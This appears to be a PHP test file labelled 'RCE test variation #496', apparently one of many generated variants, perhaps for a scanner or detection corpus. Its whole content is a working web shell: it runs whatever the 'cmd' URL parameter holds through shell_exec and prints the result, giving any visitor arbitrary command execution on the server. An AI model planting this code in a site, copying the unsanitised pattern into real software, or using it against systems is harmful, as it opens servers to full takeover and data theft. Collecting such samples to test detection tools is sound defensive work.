<?php
// RCE test variation #496
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>